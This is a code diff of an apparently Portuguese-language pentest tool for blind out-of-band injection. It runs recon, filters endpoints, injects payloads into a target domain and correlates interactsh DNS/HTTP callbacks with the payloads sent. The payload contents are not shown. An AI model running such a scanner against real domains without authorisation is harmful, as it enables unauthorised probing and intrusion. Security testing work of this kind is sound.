 def _parse_interactsh_ts(ts_str: str) -> Optional[float]:
     """
-    Converte o campo timestamp do interactsh (RFC3339 com nanosegundos)
-    para float unix timestamp.
+    Converte timestamp RFC3339 com nanosegundos para float unix.
     Ex: "2026-05-25T15:33:20.106317855Z" → 1748183600.106317
-    Python's fromisoformat não aceita nanosegundos — trunca para microssegundos.
     """
     if not ts_str:
         return None
     try:
-        # Trunca nanosegundos para microssegundos (6 dígitos)
         ts_norm = re.sub(r'(\.\d{6})\d+(Z?)$', r'\1\2', ts_str)
         ts_norm = ts_norm.replace("Z", "+00:00")
         return datetime.fromisoformat(ts_norm).timestamp()
     except Exception:
         return None
 
-
 def _process_hit(data: dict, plog: PayloadLog,
                  hits: list, hits_file: Path):
     """
     Processa um hit JSON do interactsh-client v1.3+.
 
-    Campos relevantes no JSON real:
+    Campos relevantes:
       protocol      : "dns" | "http" | "smtp" | ...
       unique-id     : ID base do host interactsh
-      full-id       : ID completo (pode incluir subpath do payload)
+      full-id       : ID completo (inclui subdomínio = nosso UID)
       q-type        : "A" | "AAAA" | "MX" ... (DNS)
-      raw-request   : string com a requisição recebida
+      raw-request   : requisição recebida (HTTP/SMTP)
       remote-address: IP de quem fez a requisição OOB
-      timestamp     : RFC3339 com nanosegundos — quando o hit chegou
+      timestamp     : RFC3339 com nanosegundos
     """
     raw_id      = data.get("full-id", data.get("unique-id", ""))
     protocol    = data.get("protocol", "unknown").upper()
     remote_addr = data.get("remote-address", "?")
     raw_request = data.get("raw-request", "")
-    q_type      = data.get("q-type", "")          # só DNS
+    q_type      = data.get("q-type", "")
 
-    # ── Timestamp: prefere o do JSON (preciso), fallback para now() ───────
     hit_ts_str  = data.get("timestamp", "")
     hit_ts_unix = _parse_interactsh_ts(hit_ts_str) or time.time()
     received_at = hit_ts_str or datetime.now(timezone.utc).isoformat()
 
-    # Para DNS, exibe o tipo de query
     proto_label = f"{protocol}/{q_type}" if q_type else protocol
 
     log(f"\n{'━'*60}", C.RED + C.BOLD)
@@ -880,24 +903,24 @@ def _process_hit(data: dict, plog: PayloadLog,
     log(f"  Full-ID    : {raw_id}",       C.YELLOW)
     log(f"  Timestamp  : {received_at}",  C.YELLOW)
 
-    # Mostra primeira linha da requisição (HTTP) ou query DNS
     if raw_request:
         first_line = raw_request.split("\n")[0].strip()
         if first_line:
             log(f"  Request    : {first_line[:120]}", C.YELLOW)
 
-    # ── Correlação com payload enviado ────────────────────────────────────
-    # find_fuzzy procura o UID embutido no subpath do full-id
-    # Ex: full-id = "xss-17480523102345-a3f9c2-srch.abc.oast.fun"
-    #     → encontra uid "xss-17480523102345-a3f9c2-srch" no payload_log
+    # FIX: correlação em dois passos.
+    # 1. Tenta pelo full-id (DNS — UID está no subdomínio → funciona 100%).
+    # 2. Fallback: varre raw_request (HTTP — UID pode estar no path ou body).
     matched = plog.find_fuzzy(raw_id)
+    if not matched and raw_request:
+        matched = plog.find_fuzzy_in_request(raw_request)
+        if matched:
+            log(f"  (correlação via raw_request)", C.DIM, "debug")
 
     delay_str = "?"
     if matched:
-        # Delay = timestamp do hit (do JSON) − unix_ts do payload (ms → s)
         sent_ts_unix = matched["unix_ts"] / 1000.0
         delay_s      = hit_ts_unix - sent_ts_unix
-        # Delay negativo = hit chegou antes de registrar (improvável) ou clock skew
         if delay_s < 0:
             delay_str = f"~{abs(delay_s):.1f}s (clock skew?)"
         elif delay_s > 3600:
@@ -961,7 +984,6 @@ def _write_summary(hits: list, plog: PayloadLog, summary_file: Path):
         "",
     ]
 
-    # Agrupa hits por categoria
     by_cat: dict[str, list] = {}
     for h in hits:
         m = h.get("matched_entry") or {}
@@ -1026,23 +1048,23 @@ Exemplos:
       --poll --monitor-time 600
         """
     )
-    p.add_argument("-d", "--domain",       required=True,  help="Domínio alvo")
-    p.add_argument("-o", "--oob",          required=True,  help="Host interactsh (ex: abc.oast.fun)")
-    p.add_argument("--skip-recon",         action="store_true", help="Pula reconhecimento")
-    p.add_argument("--skip-inject",        action="store_true", help="Pula injeção")
-    p.add_argument("--poll",               action="store_true", help="Só monitora OOB")
-    p.add_argument("--monitor-time",       type=int,   default=300,  metavar="S",
+    p.add_argument("-d", "--domain",    required=True,  help="Domínio alvo")
+    p.add_argument("-o", "--oob",       required=True,  help="Host interactsh (ex: abc.oast.fun)")
+    p.add_argument("--skip-recon",      action="store_true", help="Pula reconhecimento")
+    p.add_argument("--skip-inject",     action="store_true", help="Pula injeção")
+    p.add_argument("--poll",            action="store_true", help="Só monitora OOB")
+    p.add_argument("--monitor-time",    type=int,   default=300,  metavar="S",
                    help="Duração do monitoramento em segundos (default: 300)")
-    p.add_argument("--delay",              type=float, default=0.3,  metavar="S",
-                   help="Delay entre requisições por thread (default: 0.3)")
-    p.add_argument("--threads",            type=int,   default=3,    metavar="N",
+    p.add_argument("--delay",           type=float, default=0.5,  metavar="S",
+                   help="Delay mínimo entre requisições — rate limit global (default: 0.5)")
+    p.add_argument("--threads",         type=int,   default=3,    metavar="N",
                    help="Threads de injeção paralelas (default: 3)")
-    p.add_argument("--categories",         nargs="+",  metavar="CAT",
+    p.add_argument("--categories",      nargs="+",  metavar="CAT",
                    choices=list(PAYLOADS.keys()),
                    help="Categorias a injetar (default: todas)")
-    p.add_argument("--proxy",              default="",   metavar="URL",
+    p.add_argument("--proxy",           default="",   metavar="URL",
                    help="Proxy HTTP (ex: http://127.0.0.1:8080)")
-    p.add_argument("--output-dir",         default="oob_results", metavar="DIR",
+    p.add_argument("--output-dir",      default="oob_results", metavar="DIR",
                    help="Diretório de saída (default: oob_results/)")
     return p.parse_args()
 
@@ -1051,10 +1073,13 @@ def main():
     banner()
     args = parse_args()
 
-    # Sanitiza domínio — previne command injection residual
     if not re.match(r'^[a-zA-Z0-9.\-]+$', args.domain):
         print(f"{C.RED}Domínio inválido: {args.domain}{C.RESET}")
         sys.exit(1)
+
+    # FIX: inicializa o rate limiter global com o delay escolhido pelo usuário.
+    global _rate_limiter
+    _rate_limiter = GlobalRateLimiter(args.delay)
 
     out = Path(args.output_dir) / args.domain.replace(".", "_")
     out.mkdir(parents=True, exist_ok=True)
@@ -1062,19 +1087,17 @@ def main():
     global logger
     logger = setup_logging(out)
 
-    log(f"Alvo     : {args.domain}", C.CYAN + C.BOLD)
-    log(f"OOB Host : {args.oob}",    C.CYAN + C.BOLD)
-    log(f"Threads  : {args.threads}", C.CYAN)
-    log(f"Delay    : {args.delay}s",  C.CYAN)
-    log(f"Output   : {out}/",         C.CYAN)
+    log(f"Alvo       : {args.domain}", C.CYAN + C.BOLD)
+    log(f"OOB Host   : {args.oob}",    C.CYAN + C.BOLD)
+    log(f"Threads    : {args.threads}", C.CYAN)
+    log(f"Rate limit : 1 req / {args.delay}s (global)", C.CYAN)
+    log(f"Output     : {out}/",         C.CYAN)
     if args.proxy:
-        log(f"Proxy    : {args.proxy}", C.CYAN)
+        log(f"Proxy      : {args.proxy}", C.CYAN)
 
     plog = PayloadLog(out / "payload_log.jsonl")
 
-    # ── Modo: só poll ─────────────────────────────────────────────────────────
     if args.poll:
-        # Tenta recarregar payload_log de sessão anterior
         plog_file = out / "payload_log.jsonl"
         if plog_file.exists():
             for line in plog_file.read_text().splitlines():
@@ -1088,7 +1111,6 @@ def main():
         phase_monitor(args.oob, plog, out, args.monitor_time)
         return
 
-    # ── Fase 1: Recon ─────────────────────────────────────────────────────────
     live_urls_file = out / "live_urls.txt"
     if not args.skip_recon:
         live_urls_file = phase_recon(args.domain, out)
@@ -1098,7 +1120,6 @@ def main():
             sys.exit(1)
         log(f"Recon pulado. Usando: {live_urls_file}", C.YELLOW)
 
-    # ── GF ────────────────────────────────────────────────────────────────────
     category_files = phase_gf(live_urls_file, out)
     if args.categories:
         category_files = {k: v for k, v in category_files.items()
@@ -1107,10 +1128,7 @@ def main():
     if not category_files:
         log("Nenhum endpoint encontrado após filtragem gf.", C.YELLOW, "warning")
 
-    # ── Fase 2 + 3 em paralelo ───────────────────────────────────────────────
     if not args.skip_inject and category_files:
-        # Inicia monitor em thread separada ANTES de começar injeção
-        # → captura hits que chegam enquanto ainda está injetando
         monitor_thread = phase_monitor(
             args.oob, plog, out, args.monitor_time, parallel=True
         )
